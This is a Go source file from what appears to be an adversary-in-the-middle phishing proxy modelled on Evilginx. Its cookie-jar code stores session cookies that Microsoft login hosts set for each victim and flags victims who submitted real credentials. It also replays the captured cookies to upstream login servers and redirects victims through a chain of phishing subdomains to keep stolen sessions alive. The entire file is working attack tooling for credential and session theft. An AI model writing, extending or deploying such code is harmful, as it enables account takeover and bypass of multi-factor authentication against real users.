package proxy

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/user/evilpikin/internal/storage"
)

const SyncPath = "/__ep_sync"

func newSID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return hex.EncodeToString([]byte(time.Now().Format("150405.000000000")))
	}
	return hex.EncodeToString(b)
}

type jarCookie struct {
	Name, Value, Domain, Path string
	HttpOnly, Secure          bool
}

type jarSession struct {
	id      string
	mu      sync.Mutex
	cookies map[string]jarCookie
}

type CookieJar struct {
	mu       sync.Mutex
	sessions map[string]*jarSession
	captured map[string]bool
	// SiteDomain scopes the session cookie to the phishing base domain so a
	// session survives cross-host hops through the auth chain (TLD+1 style).
	SiteDomain string
}

func NewCookieJar(siteDomain string) *CookieJar {
	return &CookieJar{sessions: make(map[string]*jarSession), captured: make(map[string]bool), SiteDomain: siteDomain}
}

// MarkCaptured flags a victim session as having submitted real credentials so
// the response rewriter can stop collapsing post-auth dashboard navigations.
func (j *CookieJar) MarkCaptured(sid string) {
	if sid == "" {
		return
	}
	j.mu.Lock()
	if j.captured == nil {
		j.captured = make(map[string]bool)
	}
	j.captured[sid] = true
	j.mu.Unlock()
}

// IsCaptured reports whether the session has submitted real credentials.
func (j *CookieJar) IsCaptured(sid string) bool {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.captured[sid]
}

func (j *CookieJar) getOrCreate(sid string) *jarSession {
	j.mu.Lock()
	s, ok := j.sessions[sid]
	if !ok {
		s = &jarSession{id: sid, cookies: make(map[string]jarCookie)}
		j.sessions[sid] = s
	}
	j.mu.Unlock()
	return s
}

func (j *CookieJar) storeCookie(sid, origin string, c storage.CapturedCookie) {
	s := j.getOrCreate(sid)
	s.mu.Lock()
	s.cookies[origin+"|"+c.Name] = jarCookie{
		Name: c.Name, Value: c.Value, Domain: origin, Path: c.Path,
		HttpOnly: c.HttpOnly, Secure: c.Secure,
	}
	s.mu.Unlock()
}

func (j *CookieJar) cookiesForOrigin(sid, origin string) []jarCookie {
	s := j.getOrCreate(sid)
	out := []jarCookie{}
	s.mu.Lock()
	for k, c := range s.cookies {
		if strings.HasPrefix(k, origin+"|") {
			out = append(out, c)
		}
	}
	s.mu.Unlock()
	return out
}

// cookiesForSession returns every cookie captured in the victim's session,
// regardless of which origin set it. The auth chain spans many real hosts
// (login.microsoftonline.com, login.microsoft.com, login.live.com, ...) that
// share session state via parent-domain cookies; replaying the whole session
// bag to each upstream request is what keeps the flow alive across the
// enterprise<->consumer realm transition. This mirrors the Evilginx behavior
// of injecting captured session cookies into every request of the session.
func (j *CookieJar) cookiesForSession(sid string) []jarCookie {
	s := j.getOrCreate(sid)
	out := []jarCookie{}
	s.mu.Lock()
	for _, c := range s.cookies {
		out = append(out, c)
	}
	s.mu.Unlock()
	return out
}

func (j *CookieJar) ensureSID(r *http.Request, proxyHost string) (string, bool) {
	if c, err := r.Cookie("__ep_sid"); err == nil && c.Value != "" {
		return c.Value, false
	}
	return newSID(), true
}

func (j *CookieJar) OnResponse(target *storage.TargetProfile, resp *http.Response, req *http.Request) {
	sid, isNew := j.ensureSID(req, target.ProxyHost)
	for _, cstr := range resp.Header.Values("Set-Cookie") {
		if cc := parseSetCookie(cstr); cc != nil {
			j.storeCookie(sid, target.Origin, *cc)
			for rel := range target.RelatedDomains {
				j.storeCookie(sid, rel, *cc)
			}
		}
	}
	cookieDomain := cookieScopeForTarget(j.SiteDomain, target)
	if cookieDomain == "" {
		cookieDomain = target.ProxyHost
	}
	resp.Header.Add("Set-Cookie",
		fmt.Sprintf("__ep_sid=%s; Domain=.%s; Path=/; Secure; HttpOnly", sid, cookieDomain))
	// The cross-domain session-sync bounce is only needed in legacy per-host
	// cookie mode. When the session cookie is scoped to the site domain
	// (SiteDomain set), it is already shared across every phishing subdomain,
	// so the bounce is redundant — and would otherwise build port-less URLs
	// that escape the dev listener.
	if isNew && j.SiteDomain == "" && len(target.RelatedDomains) > 0 {
		if loc := resp.Header.Get("Location"); loc != "" {
			resp.Header.Set("Location", j.buildSyncChain(target, sid, loc))
		}
	}
}

func (j *CookieJar) buildSyncChain(target *storage.TargetProfile, sid, loc string) string {
	phs := map[string]bool{}
	for _, ph := range target.RelatedDomains {
		if ph != target.ProxyHost {
			phs[ph] = true
		}
	}
	next := loc
	for ph := range phs {
		next = fmt.Sprintf("https://%s%s?sid=%s&next=%s", ph, SyncPath, sid, url.QueryEscape(next))
	}
	return next
}
